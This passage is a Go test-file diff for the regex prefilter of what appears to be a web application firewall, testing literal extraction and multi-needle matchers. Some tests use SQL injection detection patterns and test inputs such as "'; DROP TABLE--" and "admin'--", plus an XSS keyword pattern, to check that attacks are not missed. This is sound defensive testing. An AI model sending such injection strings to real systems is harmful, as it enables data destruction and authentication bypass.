+	// Both present in matching input
+	if !pf("HeLLo something WoRlD") {
+		t.Error("expected true for mixed-case match")
+	}
+}
+
+// TestPrefilterAllRequiredMultiNeedleCaseSensitive covers the case-sensitive
+// multi-needle allRequired path (lines 203-211).
+func TestPrefilterAllRequiredMultiNeedleCaseSensitive(t *testing.T) {
+	// Pattern: hello.*world — two required CS literals, no (?i).
+	pf := prefilterFunc("(?s)hello.*world")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for hello.*world")
+	}
+	if !pf("prefix hello middle world suffix") {
+		t.Error("expected true when both literals present")
+	}
+	if pf("prefix hello middle suffix") {
+		t.Error("expected false when 'world' is absent")
+	}
+	// Case-sensitive: HELLO should not match
+	if pf("HELLO WORLD") {
+		t.Error("expected false for case-sensitive mismatch")
+	}
+}
+
+// TestPrefilterAnyRequiredSingleNeedle covers the anyRequired single-element
+// paths for both CI and CS (lines 226-236).
+func TestPrefilterAnyRequiredSingleNeedle(t *testing.T) {
+	// Alternation where one branch is too short gets abandoned.
+	// Use branches that are all >= 2 bytes but only one branch.
+	// A single-branch alternation: (hello) is really just allRequired.
+	// To get anyRequired with 1 element, we need a nested alternation that
+	// collapses. Instead, test the single-needle CS path via a 2-branch pattern
+	// where one gets merged.
+	//
+	// Actually, the simplest way: pattern `(ab|cd)` yields anyRequired{"ab","cd"}
+	// which hits the AC path. To test single-element anyRequired, we need a
+	// pattern like `(ab)` parsed as alternation — but that's OpCapture.
+	// Let's test the CI+CS anyRequired with 2 elements instead (lines 228-235).
+
+	// Case-insensitive anyRequired single needle — unreachable in practice
+	// because OpAlternate always has >= 2 sub-expressions. Skip.
+
+	// Case-sensitive anyRequired 2 elements
+	pf := prefilterFunc("(?s)(?:hello|world)")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for hello|world")
+	}
+	if !pf("contains hello here") {
+		t.Error("expected true when 'hello' present")
+	}
+	if !pf("contains world here") {
+		t.Error("expected true when 'world' present")
+	}
+	if pf("contains nothing here") {
+		t.Error("expected false when neither present")
+	}
+}
+
+// TestPrefilterAnyRequiredCaseInsensitiveAC covers the CI Aho-Corasick path.
+func TestPrefilterAnyRequiredCaseInsensitiveAC(t *testing.T) {
+	pf := prefilterFunc("(?si)(?:hello|world)")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for (?i)hello|world")
+	}
+	if !pf("HELLO there") {
+		t.Error("expected true for CI match on 'HELLO'")
+	}
+	if !pf("WoRlD") {
+		t.Error("expected true for CI match on 'WoRlD'")
+	}
+	if pf("nothing here") {
+		t.Error("expected false when neither present")
+	}
+}
+
+// TestPrefilterAnyRequiredNonASCIIBailout covers the non-ASCII guard for
+// CI anyRequired Aho-Corasick path (lines 237-243).
+func TestPrefilterAnyRequiredNonASCIIBailout(t *testing.T) {
+	// Construct a pattern that produces anyRequired with non-ASCII literals.
+	// (?i)(café|naïve) — after lowercasing, needles contain non-ASCII bytes.
+	pf := prefilterFunc("(?si)(?:café|naïve)")
+	// Should bail out because needles are non-ASCII under CI.
+	if pf != nil {
+		t.Error("prefilterFunc should return nil for CI pattern with non-ASCII literals")
+	}
+}
+
+// TestPrefilterNonCaseInsensitiveReturnsDirectly covers the non-CI return path
+// (line 285) — pf is returned without the isASCII wrapper.
+func TestPrefilterNonCaseInsensitiveReturnsDirectly(t *testing.T) {
+	pf := prefilterFunc("(?s)hello")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for 'hello'")
+	}
+	// Non-ASCII input should be checked literally (no isASCII guard).
+	if pf("café") {
+		t.Error("expected false: 'hello' not in 'café'")
+	}
+	if !pf("say hello") {
+		t.Error("expected true: 'hello' in 'say hello'")
+	}
+}
+
+// TestExtractLiteralsOpConcatAnyRequiredChild covers the case where OpConcat
+// has an anyRequired child that gets skipped (lines 339-343).
+func TestExtractLiteralsOpConcatAnyRequiredChild(t *testing.T) {
+	// Pattern: (ab|cd).*required — OpConcat with an OpAlternate child (anyRequired),
+	// wildcard, and an OpLiteral child. The wildcard forces a real concatenation.
+	// The anyRequired from the alternation is skipped in OpConcat; only "required"
+	// is kept as allRequired.
+	pf := prefilterFunc("(?s)(?:ab|cd).*required")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil")
+	}
+	if !pf("ab stuff required here") {
+		t.Error("expected true: 'required' present")
+	}
+	if pf("ab stuff missing here") {
+		t.Error("expected false: 'required' absent")
+	}
+}
+
+func TestExtractLiteralsOpConcatRetainsBestAlternative(t *testing.T) {
+	pf := prefilterFunc("(?s)(?:alpha|bravo).*(?:select|union|insert)")
+	if pf == nil {
+		t.Fatal("prefilterFunc should retain a required alternative from concatenation")
+	}
+	for _, input := range []string{"alpha then select", "bravo then union", "alpha then insert"} {
+		if !pf(input) {
+			t.Errorf("expected a possible match for %q", input)
+		}
+	}
+	if pf("charlie then select") {
+		t.Error("expected the retained alternatives to reject the input")
+	}
+}
+
+// TestExtractLiteralsOpAlternateNilBranch covers OpAlternate where one branch
+// has no extractable literal (lines 360-362).
+func TestExtractLiteralsOpAlternateNilBranch(t *testing.T) {
+	// Pattern: (hello|.+) — second branch is .+ which has no literal.
+	pf := prefilterFunc("(?s)(?:hello|.+)")
+	if pf != nil {
+		t.Error("prefilterFunc should return nil when one alternation branch has no literal")
+	}
+}
+
+// TestExtractLiteralsNestedAlternation covers the anyRequired merge path
+// for nested alternations (lines 368-374).
+func TestExtractLiteralsNestedAlternation(t *testing.T) {
+	// Pattern: (hello|(world|test)) — nested alternation.
+	pf := prefilterFunc("(?s)(?:hello|(?:world|test))")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for nested alternation")
+	}
+	if !pf("hello") {
+		t.Error("expected true for 'hello'")
+	}
+	if !pf("world") {
+		t.Error("expected true for 'world'")
+	}
+	if !pf("test") {
+		t.Error("expected true for 'test'")
+	}
+	if pf("none") {
+		t.Error("expected false for 'none'")
+	}
+}
+
+// TestExtractLiteralsOpRepeat covers OpRepeat in extractLiterals (lines 385-389).
+func TestExtractLiteralsOpRepeat(t *testing.T) {
+	// OpRepeat with min>=1: should extract literals from sub.
+	// Note: Simplify() may expand {n,m} to concat/quest, but we test the
+	// function directly via minMatchLength which also exercises the AST.
+	// For extractLiterals, a pattern like (hello){2,3} after simplify becomes
+	// OpConcat(hello, hello, OpQuest(hello)).
+
+	// OpRepeat with min==0: should return nil.
+	// Pattern: (hello){0,3} — optional repetition.
+	pf := prefilterFunc("(?s)(?:hello){0,3}")
+	if pf != nil {
+		t.Error("prefilterFunc should return nil for {0,3} (min==0)")
+	}
+}
+
+// TestLongestEmpty covers longest with an empty slice (line 416-417).
+func TestLongestEmpty(t *testing.T) {
+	if got := longest(nil); got != "" {
+		t.Errorf("longest(nil) = %q, want empty", got)
+	}
+	if got := longest([]string{}); got != "" {
+		t.Errorf("longest([]) = %q, want empty", got)
+	}
+}
+
+// TestAllASCIIStringsNonASCII covers allASCIIStrings returning false (line 456-457).
+func TestAllASCIIStringsNonASCII(t *testing.T) {
+	if allASCIIStrings([]string{"hello", "café"}) {
+		t.Error("allASCIIStrings should return false for non-ASCII")
+	}
+	if !allASCIIStrings([]string{"hello", "world"}) {
+		t.Error("allASCIIStrings should return true for all ASCII")
+	}
+}
+
+func TestPrefilterAnyRequiredRetainsSingleByteAlternatives(t *testing.T) {
+	pf := prefilterFunc("(?s)(?:a|hello)")
+	if pf == nil {
+		t.Fatal("prefilterFunc should retain one-byte alternatives")
+	}
+	for _, value := range []string{"a", "hello"} {
+		if !pf(value) {
+			t.Errorf("expected a possible match for %q", value)
+		}
+	}
+	if pf("zzzzz") {
+		t.Error("expected unrelated input to be rejected")
+	}
+}
+
+func TestPrefilterRetainsSmallCharacterClassAlternatives(t *testing.T) {
+	pattern := `(?i)(?:[;={}]+|select|union)`
+	pf := prefilterFunc(pattern)
+	if pf == nil {
+		t.Fatal("prefilterFunc should retain a small character class")
+	}
+	for _, value := range []string{";", "name=value", "SELECT", "union"} {
+		if !pf(value) {
+			t.Errorf("expected a possible match for %q", value)
+		}
+	}
+	if pf(strings.Repeat("x", 64<<10)) {
+		t.Error("expected a large unrelated body to be rejected")
+	}
+}
+
+func TestPrefilterAllRequiredSelectsOneNecessaryShortLiteral(t *testing.T) {
+	pf := prefilterFunc("(?s)a.*b")
+	if pf == nil {
+		t.Fatal("prefilterFunc should retain a necessary short literal")
+	}
+	if !pf("axb") || pf("zzz") {
+		t.Error("unexpected short-literal filter result")
+	}
+}
+
+// TestPrefilterCaseInsensitiveWithNonASCIIInput covers the Unicode simple-fold
+// exceptions that can make an ASCII literal match non-ASCII input.
+func TestPrefilterCaseInsensitiveWithNonASCIIInput(t *testing.T) {
+	pf := prefilterFunc("(?si)hello")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for (?i)hello")
+	}
+	if pf("héllo") {
+		t.Error("expected unrelated non-ASCII input to be rejected")
+	}
+	if pf("goodbye") {
+		t.Error("expected false for 'goodbye'")
+	}
+
+	longS := prefilterFunc("(?si)select")
+	if longS == nil || !longS("ſelect") {
+		t.Error("expected long s to preserve a possible Unicode-fold match")
+	}
+	kelvin := prefilterFunc("(?si)key")
+	if kelvin == nil || !kelvin("Key") {
+		t.Error("expected Kelvin sign to preserve a possible Unicode-fold match")
+	}
+}
+
+// TestMinLenOpRepeatUnreachable exercises the OpRepeat branch in minLen that is
+// normally unreachable after Simplify (lines 140-148). We test it indirectly
+// via patterns that include quantifiers.
+func TestMinLenOpRepeatViaPattern(t *testing.T) {
+	// {3,5} → Simplify expands to OpConcat/OpQuest, but minLen still computes
+	// correctly because the expanded form sums to the same minimum.
 	if got := minMatchLength("a{3,5}"); got != 3 {
 		t.Errorf("minMatchLength(a{3,5}) = %d, want 3", got)
 	}
+	// {0,5} → minimum is 0
 	if got := minMatchLength("a{0,5}"); got != 0 {
 		t.Errorf("minMatchLength(a{0,5}) = %d, want 0", got)
 	}
 }
 
-// TestTrieReconstructionBasic verifies that prefilterFunc correctly handles
-// Simplify()-generated trie patterns where a short single-byte prefix is
-// factored out of an alternation.
-//
-// Without trie reconstruction:
-//
-//	select|sleep|substr  →  s(?:elect|leep|ubstr)
-//	extractLiterals(OpLiteral("s")) = nil  →  whole pattern = nil
-//	prefilterFunc returns nil  →  no prefilter built at all
-//
-// With trie reconstruction the full words are recovered and used as the
-// anyRequired set, enabling sub-linear Wu-Manber prefiltering.
-func TestTrieReconstructionBasic(t *testing.T) {
-	tests := []struct {
-		name        string
-		pattern     string
-		shouldMatch []string
-		shouldMiss  []string
+// TestExtractLiteralsEmptyBranchLits covers the empty branchLits guard
+// in OpAlternate (lines 377-379).
+func TestExtractLiteralsEmptyBranchLits(t *testing.T) {
+	// Pattern where all alternation branches have no extractable literals.
+	// (.+|.*) — both branches are wildcards.
+	pf := prefilterFunc("(?s)(?:.+|.*)")
+	if pf != nil {
+		t.Error("prefilterFunc should return nil when no branch has literals")
+	}
+}
+
+func BenchmarkRxPrefilter(b *testing.B) {
+	benchmarks := []struct {
+		name    string
+		pattern string
+		input   string
 	}{
 		{
-			name:    "single_prefix_alternation",
-			pattern: "(?i)(?:select|sleep|substr)",
-			// Simplify() → s(?:elect|leep|ubstr) — single-byte prefix 's'
-			shouldMatch: []string{"SELECT", "sleep(1)", "substr(x,1)"},
-			shouldMiss:  []string{"hello world", "GET /api/v1/users", "x=1&y=2"},
+			name:    "crs_sqli_alternation",
+			pattern: `(?:union\s+select|insert\s+into|delete\s+from)`,
+			input:   "GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
 		},
 		{
-			name:    "multi_group_sql_keywords",
-			pattern: "(?i)(?:select|sleep|substr|union|update|insert|delete)",
-			// Simplify() groups by first byte: s(..), u(..), i(..), d(..)
-			// Each group has a single-byte prefix that was previously causing nil.
-			shouldMatch: []string{"SELECT id", "UNION ALL", "UPDATE users", "INSERT INTO", "DELETE FROM"},
-			shouldMiss:  []string{"GET /home", "Host: example.com", "Content-Type: text/html"},
+			name:    "crs_sqli_case_insensitive",
+			pattern: `(?i)(?:union\s+select|insert\s+into|delete\s+from)`,
+			input:   "GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
 		},
 		{
-			name:    "two_char_prefix_reconstruction",
-			pattern: "(?i)(?:replace|reverse|repeat)",
-			// Simplify() → re(?:place|verse|peat) — 2-char prefix "re"
-			// The 2-char prefix IS extracted by the standard path as allRequired{"re"},
-			// so this tests that the standard path still works correctly.
-			shouldMatch: []string{"REPLACE INTO", "reverse order", "repeat(x,3)"},
-			shouldMiss:  []string{"hello world", "GET /users"},
+			name:    "literal_concat",
+			pattern: `hello.*world`,
+			input:   "just a normal request without any attack payload at all",
 		},
 		{
-			name:    "nested_trie_reconstruction",
-			pattern: "(?i)(?:select|set|sleep)",
-			// Simplify() → s(?:e(?:lect|t)|leep) — nested trie
-			// trieReconstruct (prefix "s") runs before anyRequired propagation,
-			// so the result is anyRequired{"select","set","sleep"} — NOT the
-			// shorter {"elect","et","leep"} that propagation alone would yield.
-			// ("et" is a substring of "GET", so the shorter form causes false positives.)
-			shouldMatch: []string{"SELECT *", "set @x=1", "SLEEP(5)"},
-			shouldMiss:  []string{"GET /api", "x=1&y=2"},
-		},
-		{
-			name:    "anchor_or_separator_then_keywords",
-			pattern: `(?i)(?:^|["':;=])\s*(?:alert|prompt|confirm)`,
-			// Branch (?:^|["':;=]) returns nil because the ^ sub-branch has no literal.
-			// anyRequired propagation in OpConcat surfaces the keyword alternation:
-			// → anyRequired{"alert","prompt","confirm"}
-			shouldMatch: []string{"alert(1)", `";alert(1)`, "PROMPT(x)", "=confirm()"},
-			shouldMiss:  []string{"GET /api", "content-type: text/html", "user@example.com"},
-		},
-		{
-			name:    "large_sql_alternation",
-			pattern: "(?i)(?:select|sleep|substr|union|update|insert|delete|alter|create|benchmark|floor|format|length|concat|decode|encode|replace|reverse|trim|upper)",
-			// 20 SQL keywords — Simplify() groups: s(..), u(..), i(..), d(..), a(..), c(..), b(..), f(..), l(..), r(..), t(..)
-			// Previously: all groups with single-byte prefix returned nil → no prefilter
-			// After fix: each group reconstructed → anyRequired{all 20 keywords}
-			shouldMatch: []string{"SELECT id FROM", "UNION ALL SELECT", "benchmark(1000000,1)", "UPPER(col)"},
-			shouldMiss:  []string{"GET /api/v1/users?page=1", "Host: example.com", "Content-Type: application/json"},
+			name:    "no_prefilter_charclass",
+			pattern: `[a-z]+\d+`,
+			input:   "just a normal request without any attack payload at all",
 		},
 	}
 
-	for _, tc := range tests {
-		tc := tc
-		t.Run(tc.name, func(t *testing.T) {
-			pf := prefilterFunc(tc.pattern)
-			if pf == nil {
-				t.Fatalf("prefilterFunc returned nil — trie reconstruction likely not working (pattern: %s)", tc.pattern)
+	for _, bm := range benchmarks {
+		re := regexp.MustCompile(bm.pattern)
+		pf := prefilterFunc(bm.pattern)
+		ml := minMatchLength(bm.pattern)
+
+		b.Run(bm.name+"/regex_only", func(b *testing.B) {
+			for i := 0; i < b.N; i++ {
+				re.MatchString(bm.input)
 			}
-			for _, s := range tc.shouldMatch {
-				if !pf(s) {
-					t.Errorf("prefilter false-negative for input %q (pattern: %s)", s, tc.pattern)
+		})
+
+		b.Run(bm.name+"/prefilter+regex", func(b *testing.B) {
+			for i := 0; i < b.N; i++ {
+				if len(bm.input) < ml {
+					continue
 				}
-			}
-			for _, s := range tc.shouldMiss {
-				if pf(s) {
-					t.Errorf("prefilter false-positive for input %q (pattern: %s)", s, tc.pattern)
+				if pf != nil && !pf(bm.input) {
+					continue
 				}
+				re.MatchString(bm.input)
 			}
 		})
 	}
 }
 
-// TestTrieReconstructionSafety verifies that trie reconstruction never produces
-// false negatives: for inputs that the regex matches, the prefilter must also
-// return true.
-func TestTrieReconstructionSafety(t *testing.T) {
-	patterns := []string{
-		"(?i)(?:select|sleep|substr|union)",
-		"(?i)(?:select|sleep|substr|union|update|insert|delete|alter|create|benchmark|floor|format|length|concat|decode|encode|replace|reverse|trim|upper)",
-		"(?i)(?:exec|execute|call|sp_|xp_|@@version|information_schema)",
+func TestExtractExactMatch(t *testing.T) {
+	tests := []struct {
+		name    string
+		pattern string
+		literal string
+		fold    bool
+	}{
+		{name: "anchored literal", pattern: `^Upload$`, literal: "Upload"},
+		{name: "case insensitive literal", pattern: `(?i)^Upload$`, literal: "UPLOAD", fold: true},
+		{name: "absolute anchors", pattern: `\Avalue\z`, literal: "value"},
+		{name: "unanchored", pattern: `value`},
+		{name: "non literal", pattern: `^value.*$`},
 	}
-	inputs := []string{
-		"SELECT * FROM users", "sleep(5)", "UNION SELECT", "update users set",
-		"INSERT INTO t", "delete from t where", "benchmark(1000,1)",
-		"floor(rand())", "UPPER('a')", "concat(1,2)",
-		"1 AND 1=1", "'; DROP TABLE--", "admin'--",
-	}
-
-	for _, pat := range patterns {
-		re, err := regexp.Compile(pat)
-		if err != nil {
-			t.Fatalf("compile %q: %v", pat, err)
-		}
-		pf := prefilterFunc(pat)
-		if pf == nil {
-			continue // no prefilter built — skip (not a failure)
-		}
-		for _, input := range inputs {
-			regexMatch := re.MatchString(input)
-			prefilterSays := pf(input)
-			// Safety invariant: if regex matches, prefilter must NOT say false.
-			if regexMatch && !prefilterSays {
-				t.Errorf("SAFETY VIOLATION: prefilter false-negative\n  pattern=%q\n  input=%q\n  regex=true prefilter=false", pat, input)
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			parsed, err := syntax.Parse(test.pattern, syntax.Perl)
+			if err != nil {
+				t.Fatal(err)
 			}
-		}
-	}
-}
-
-// TestIndexedMatcherNeedleCounts verifies the shift-table indexedMatcher
-// at boundary needle counts, cross-checking against a brute-force reference.
-func TestIndexedMatcherNeedleCounts(t *testing.T) {
-	pool := []string{
-		"select", "union", "insert", "delete", "update",
-		"alter", "create", "sleep", "benchmark", "extract",
-		"floor", "format", "length", "concat", "decode", "encode",
-	}
-	haystack := "GET /api/v1/users?page=1&sort=name&order=asc HTTP/1.1"
-	matchInputCS := "1 union select * from users--"
-	matchInputCI := "1 UNION SELECT * FROM users--"
-
-	bruteForceCS := func(needles []string, s string) bool {
-		for _, n := range needles {
-			if strings.Contains(s, n) {
-				return true
-			}
-		}
-		return false
-	}
-	bruteForceCI := func(needles []string, s string) bool {
-		ls := strings.ToLower(s)
-		for _, n := range needles {
-			if strings.Contains(ls, strings.ToLower(n)) {
-				return true
-			}
-		}
-		return false
-	}
-
-	for _, count := range []int{2, 8, 16} {
-		needles := pool[:count]
-
-		t.Run(fmt.Sprintf("CS_%d/no_match", count), func(t *testing.T) {
-			im := newIndexedMatcher(needles, false)
-			if got, want := im.match(haystack), bruteForceCS(needles, haystack); got != want {
-				t.Errorf("got %v, want %v", got, want)
-			}
-		})
-		t.Run(fmt.Sprintf("CS_%d/match", count), func(t *testing.T) {
-			im := newIndexedMatcher(needles, false)
-			if got, want := im.match(matchInputCS), bruteForceCS(needles, matchInputCS); got != want {
-				t.Errorf("got %v, want %v", got, want)
-			}
-		})
-		t.Run(fmt.Sprintf("CI_%d/match", count), func(t *testing.T) {
-			im := newIndexedMatcher(needles, true)
-			if got, want := im.match(matchInputCI), bruteForceCI(needles, matchInputCI); got != want {
-				t.Errorf("got %v, want %v", got, want)
+			literal, fold := extractExactMatch(parsed.Simplify())
+			if literal != test.literal || fold != test.fold {
+				t.Fatalf("unexpected exact match: want (%q, %v), have (%q, %v)", test.literal, test.fold, literal, fold)
 			}
 		})
 	}
 }
 
-// TestIndexedMatcherEveryNeedle verifies each needle is found at start/end positions,
-// in both CS and CI modes.
-func TestIndexedMatcherEveryNeedle(t *testing.T) {
-	needles := []string{"alpha", "bravo", "charlie", "delta",
-		"echo", "foxtrot", "golf", "hotel", "india", "juliet"}
-
-	for _, ci := range []bool{false, true} {
-		im := newIndexedMatcher(needles, ci)
-		mode := "CS"
-		if ci {
-			mode = "CI"
-		}
-		for _, needle := range needles {
-			display := needle
-			if ci {
-				display = strings.ToUpper(needle)
-			}
-			t.Run(fmt.Sprintf("%s/start_%s", mode, needle), func(t *testing.T) {
-				if !im.match(display + " after") {
-					t.Errorf("expected match for %q at start", display)
-				}
-			})
-			t.Run(fmt.Sprintf("%s/end_%s", mode, needle), func(t *testing.T) {
-				if !im.match("before " + display) {
-					t.Errorf("expected match for %q at end", display)
-				}
-			})
-		}
-		t.Run(mode+"/no_match", func(t *testing.T) {
-			if im.match("nothing relevant here xyz") {
-				t.Error("expected no match for irrelevant input")
-			}
-		})
-	}
-}
-
-// TestIndexedMatcherEdgeCases covers structural edge cases: shared first/last
-// bytes, varying needle lengths, boundary positions, and minimal haystacks.
-func TestIndexedMatcherEdgeCases(t *testing.T) {
-	t.Run("all_same_first_byte", func(t *testing.T) {
-		needles := []string{"select", "sleep", "substr", "system", "schema"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("call sleep(5)") {
-			t.Error("expected match for 'sleep'")
-		}
-		if !im.match("find substr here") {
-			t.Error("expected match for 'substr'")
-		}
-		if im.match("no s-words that match") {
-			t.Error("expected no match")
-		}
+func TestExactMatchPreservesCaptures(t *testing.T) {
+	operator, err := newRX(plugintypes.OperatorOptions{
+		Arguments:          `^Upload$`,
+		RxPreFilterEnabled: true,
 	})
-
-	t.Run("all_same_last_byte", func(t *testing.T) {
-		needles := []string{"update", "delete", "create", "locate", "inate"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("please delete this") {
-			t.Error("expected match for 'delete'")
-		}
-		if im.match("nothing matching") {
-			t.Error("expected no match")
-		}
-	})
-
-	t.Run("varying_needle_lengths", func(t *testing.T) {
-		needles := []string{"ab", "abcde", "abcdefghij", "xyz", "mn"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("contains ab here") {
-			t.Error("expected match for shortest needle 'ab'")
-		}
-		if !im.match("contains abcdefghij here") {
-			t.Error("expected match for longest needle")
-		}
-		if !im.match("contains xyz here") {
-			t.Error("expected match for 'xyz'")
-		}
-		if im.match("nothing relevant") {
-			t.Error("expected no match")
-		}
-	})
-
-	t.Run("haystack_exactly_minlen", func(t *testing.T) {
-		needles := []string{"hello", "world", "tests"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("hello") {
-			t.Error("expected match when haystack == needle == minLen")
-		}
-		if im.match("nope!") {
-			t.Error("expected no match when haystack == minLen but no needle")
-		}
-	})
-
-	t.Run("haystack_shorter_than_minlen", func(t *testing.T) {
-		needles := []string{"hello", "world"}
-		im := newIndexedMatcher(needles, false)
-		if im.match("hi") {
-			t.Error("expected no match when haystack < minLen")
-		}
-		if im.match("") {
-			t.Error("expected no match for empty haystack")
-		}
-	})
-
-	t.Run("needle_at_exact_end", func(t *testing.T) {
-		needles := []string{"zzend", "world"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("at the zzend") {
-			t.Error("expected match at exact end of haystack")
-		}
-	})
-
-	t.Run("overlapping_needles", func(t *testing.T) {
-		needles := []string{"abc", "bcd", "cde"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("xxabcdexx") {
-			t.Error("expected match with overlapping needles")
-		}
-		if !im.match("xxbcdxx") {
-			t.Error("expected match for 'bcd'")
-		}
-	})
-
-	t.Run("ci_mixed_case_needles_at_boundary", func(t *testing.T) {
-		needles := []string{"hello", "world"}
-		im := newIndexedMatcher(needles, true)
-		if !im.match("HELLO") {
-			t.Error("CI: expected match for exact uppercase")
-		}
-		if !im.match("hElLo") {
-			t.Error("CI: expected match for mixed case")
-		}
-		if !im.match("end WORLD") {
-			t.Error("CI: expected match at end")
-		}
-	})
-
-	t.Run("two_needles_minimal", func(t *testing.T) {
-		needles := []string{"ab", "cd"}
-		im := newIndexedMatcher(needles, false)
-		if !im.match("ab") {
-			t.Error("expected match for 'ab'")
-		}
-		if !im.match("cd") {
-			t.Error("expected match for 'cd'")
-		}
-		if im.match("ac") {
-			t.Error("expected no match for 'ac'")
-		}
-		if im.match("x") {
-			t.Error("expected no match for too-short input")
-		}
-	})
-}
-
-// TestAnyRequiredThresholdBoundary tests indexedMatcher at the anyRequiredMaxN
-// boundary (16 needles) and beyond it (256 needles fall back to no prefilter).
-func TestAnyRequiredThresholdBoundary(t *testing.T) {
-	genWords := func(n int) []string {
-		words := make([]string, n)
-		for i := 0; i < n; i++ {
-			words[i] = fmt.Sprintf("%cword%d", 'a'+rune(i%26), i)
-		}
-		return words
-	}
-
-	for _, count := range []int{16, 64} {
-		words := genWords(count)
-		im := newIndexedMatcher(words, false)
-		t.Run(fmt.Sprintf("N%d/match", count), func(t *testing.T) {
-			if !im.match("prefix " + words[0] + " suffix") {
-				t.Errorf("expected match for first needle")
-			}
-		})
-		t.Run(fmt.Sprintf("N%d/no_match", count), func(t *testing.T) {
-			if im.match("completely irrelevant input") {
-				t.Error("expected no match")
-			}
-		})
-	}
-}
-
-// TestAnyRequiredViaPrefilterFuncNeedleCounts verifies end-to-end prefilter
-// pipeline (parse → extract → matcher → evaluate) at boundary needle counts.
-func TestAnyRequiredViaPrefilterFuncNeedleCounts(t *testing.T) {
-	allWords := []string{
-		"alpha", "bravo", "charlie", "delta", "echo",
-		"foxtrot", "golf", "hotel", "india", "juliet",
-		"kilo", "lima", "mike", "november", "oscar", "papa",
-	}
-	noMatchInput := "GET /api/v1/resources?page=1&sort=name HTTP/1.1"
-
-	for _, count := range []int{2, 16} {
-		words := allWords[:count]
-		pattern := "(?:" + strings.Join(words, "|") + ")"
-		pf := prefilterFunc(pattern)
-		if pf == nil {
-			t.Fatalf("N=%d: prefilterFunc returned nil for %q", count, pattern)
-		}
-		re := regexp.MustCompile(pattern)
-
-		// One match case (first word)
-		matchInput := "some " + words[0] + " here"
-		t.Run(fmt.Sprintf("N%d/match", count), func(t *testing.T) {
-			if !re.MatchString(matchInput) {
-				t.Fatalf("test bug: regex doesn't match %q", matchInput)
-			}
-			if !pf(matchInput) {
-				t.Errorf("FALSE NEGATIVE: prefilter rejected %q", matchInput)
-			}
-		})
-		t.Run(fmt.Sprintf("N%d/no_match", count), func(t *testing.T) {
-			if re.MatchString(noMatchInput) {
-				t.Fatal("test bug: regex matches benign input")
-			}
-			_ = pf(noMatchInput) // conservative pass-through is OK
-		})
-	}
-}
-
-// TestInternalNodeCoverage exercises code paths in internal helper functions that
-// are unreachable through the public prefilterFunc / minMatchLength APIs because
-// syntax.Regexp.Simplify() expands or eliminates certain AST nodes before those
-// functions are called. We construct synthetic AST nodes directly (same package)
-// to reach the defensive branches and ensure they behave correctly.
-func TestInternalNodeCoverage(t *testing.T) {
-	// ── minLen ────────────────────────────────────────────────────────────────
-
-	t.Run("minLen/empty_OpAlternate", func(t *testing.T) {
-		// syntax.Parse never produces an empty OpAlternate after Simplify, but
-		// minLen guards against it. Verify the guard returns 0 (not a panic).
-		re := &syntax.Regexp{Op: syntax.OpAlternate, Sub: []*syntax.Regexp{}}
-		if got := minLen(re); got != 0 {
-			t.Errorf("minLen(empty OpAlternate) = %d, want 0", got)
-		}
-	})
-
-	t.Run("minLen/OpRepeat_min0", func(t *testing.T) {
-		// Simplify expands {0,n} into optional nodes, so OpRepeat with min=0 is
-		// only reachable via direct call. Must return 0 (zero repetitions allowed).
-		lit := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune("ab")}
-		re := &syntax.Regexp{Op: syntax.OpRepeat, Min: 0, Sub: []*syntax.Regexp{lit}}
-		if got := minLen(re); got != 0 {
-			t.Errorf("minLen(OpRepeat min=0) = %d, want 0", got)
-		}
-	})
-
-	t.Run("minLen/OpRepeat_min3", func(t *testing.T) {
-		// OpRepeat with min=3 and a 2-byte child → minimum 6 bytes.
-		lit := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune("ab")}
-		re := &syntax.Regexp{Op: syntax.OpRepeat, Min: 3, Sub: []*syntax.Regexp{lit}}
-		if got := minLen(re); got != 6 {
-			t.Errorf("minLen(OpRepeat min=3, child=2b) = %d, want 6", got)
-		}
-	})
-
-	// ── extractLiterals ───────────────────────────────────────────────────────
-
-	t.Run("extractLiterals/OpRepeat_min1", func(t *testing.T) {
-		// Simplify expands {1,n} into explicit concat chains, so OpRepeat min≥1
-		// is only reachable via direct call. Must recurse into the sub-expression.
-		lit := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune("select")}
-		re := &syntax.Regexp{Op: syntax.OpRepeat, Min: 1, Sub: []*syntax.Regexp{lit}}
-		got := extractLiterals(re, false)
-		if got == nil {
-			t.Error("extractLiterals(OpRepeat min=1, 'select') = nil, want allRequired{select}")
-		}
-	})
-
-	t.Run("extractLiterals/OpRepeat_min0", func(t *testing.T) {
-		// OpRepeat with min=0 is optional — no literals can be required.
-		lit := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune("select")}
-		re := &syntax.Regexp{Op: syntax.OpRepeat, Min: 0, Sub: []*syntax.Regexp{lit}}
-		if got := extractLiterals(re, false); got != nil {
-			t.Errorf("extractLiterals(OpRepeat min=0) = %v, want nil", got)
-		}
-	})
-
-	t.Run("extractLiterals/empty_OpAlternate", func(t *testing.T) {
-		// An OpAlternate with no children never executes the inner loop, so
-		// branchLits stays empty and the function returns nil.
-		re := &syntax.Regexp{Op: syntax.OpAlternate, Sub: []*syntax.Regexp{}}
-		if got := extractLiterals(re, false); got != nil {
-			t.Errorf("extractLiterals(empty OpAlternate) = %v, want nil", got)
-		}
-	})
-
-	// ── rawLiteral ────────────────────────────────────────────────────────────
-
-	t.Run("rawLiteral/RuneError", func(t *testing.T) {
-		// A literal containing U+FFFD (RuneError) must return "" to prevent the
-		// caller from building a prefilter that searches for the 3-byte UTF-8
-		// encoding instead of the single invalid byte that the regex matches.
-		re := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune{utf8.RuneError, 'x'}}
-		if got := rawLiteral(re, false); got != "" {
